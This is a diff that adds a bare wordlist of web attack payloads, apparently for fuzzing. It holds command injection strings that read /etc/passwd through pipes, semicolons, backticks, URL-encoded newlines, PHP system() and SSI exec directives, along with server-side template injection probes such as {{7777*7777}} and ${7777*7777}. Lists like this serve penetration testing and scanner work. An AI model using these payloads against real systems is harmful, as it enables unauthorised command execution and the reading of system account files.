@@ -1,0 +1,33 @@
+|id #
+`id`
+$PATH
+'$PATH
+"$PATH
+--help
+--version
+$(`cat /etc/passwd`)
+|cat /etc/passwd
+;cat /etc/passwd#
+;cat /etc/passwd
+%0Acat%20/etc/passwd
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+%0Acat%20/etc/passwd
+;system('cat%20/etc/passwd')
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+${{<%[%'"}}%\.
+@(7777*7777)
+${7777*7777}
+#{7777*7777}
+T(7777*7777)
+[=7777*7777]
+${{7777*7777}}
+{{7777*7777}}
+{{= 7777*7777}}
+{% debug %}
+<%= 7777*7777 %>
+<% 7777*7777 %>
+{system('echo 60481729')}
+*{7777*7777}
